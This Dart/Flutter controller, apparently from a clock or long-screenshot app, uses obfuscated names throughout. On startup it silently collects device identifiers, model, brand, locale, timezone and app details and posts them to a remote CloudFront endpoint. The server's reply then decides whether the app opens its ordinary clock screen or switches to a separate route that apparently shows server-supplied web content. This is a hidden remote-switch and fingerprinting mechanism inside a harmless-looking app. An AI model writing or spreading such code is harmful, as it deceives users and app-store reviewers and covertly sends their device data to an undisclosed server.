import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class LongPicMasterLogic extends GetxController {

  var oecvzn = RxBool(false);
  var hcptiek = RxBool(true);
  var cxhbijs = RxString("");
  var uyrchx = RxBool(false);
  var hrpotg = RxBool(true);
  final vpkret = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    yrodhq();
  }


  Future<void> yrodhq() async {
    uyrchx.value = true;
    hrpotg.value = true;
    hcptiek.value = false;

    vpkret.post("https://d1nbznz32t6h5y.cloudfront.net/tdlyhszocpjexmgnabkfqruwi?no_check",data: await hjfymw()).then((value) {
      var qyaghjeo = value.data["qyaghjeo"] as String;
      var qktac = value.data["qktac"] as bool;
      if (qktac) {
        cxhbijs.value = qyaghjeo;
        yhiv();
      } else {
        zwyrie();
      }
    }).catchError((e) {
      hcptiek.value = true;
      hrpotg.value = true;
      uyrchx.value = false;
    });
  }

  Future<Map<String, dynamic>> hjfymw() async {
    final DeviceInfoPlugin thmp = DeviceInfoPlugin();
    PackageInfo zahc_leck = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fdbtgyu = Platform.localeName;
    var hcbemr = currentTimeZone;

    var pzjmodr = zahc_leck.packageName;
    var idobln = zahc_leck.version;
    var ifhbtc = zahc_leck.buildNumber;

    var kmpnh = zahc_leck.appName;
    var nmar = "";
    var lprsvf  = "";
    var ewzbk = "";
    var qslbwja = "";
    var swqbnt = "";
    var zcqob = "";
    var hugs = "";
    var chogfvd = "";
    var fuycg = "";
    var danec = "";
    var aktgx = "";


    var kpcq = "";
    var rnoyqtx = false;

    if (GetPlatform.isAndroid) {
      kpcq = "android";
      var srpehzlugo = await thmp.androidInfo;

      ewzbk = srpehzlugo.brand;

      nmar  = srpehzlugo.model;
      lprsvf = srpehzlugo.id;

      rnoyqtx = srpehzlugo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      kpcq = "ios";
      var mfgtwrk = await thmp.iosInfo;
      ewzbk = mfgtwrk.name;
      nmar = mfgtwrk.model;

      lprsvf = mfgtwrk.identifierForVendor ?? "";
      rnoyqtx  = mfgtwrk.isPhysicalDevice;
    }

    var res = {
      "kmpnh": kmpnh,
      "ifhbtc": ifhbtc,
      "idobln": idobln,
      "pzjmodr": pzjmodr,
      "nmar": nmar,
      "hcbemr": hcbemr,
      "ewzbk": ewzbk,
      "lprsvf": lprsvf,
      "fdbtgyu": fdbtgyu,
      "kpcq": kpcq,
      "rnoyqtx": rnoyqtx,
      "qslbwja" : qslbwja,
      "swqbnt" : swqbnt,
      "zcqob" : zcqob,
      "hugs" : hugs,
      "chogfvd" : chogfvd,
      "fuycg" : fuycg,
      "danec" : danec,
      "aktgx" : aktgx,

    };
    return res;
  }

  Future<void> zwyrie() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> yhiv() async {
    Get.offNamed("/Outreload");
  }

}
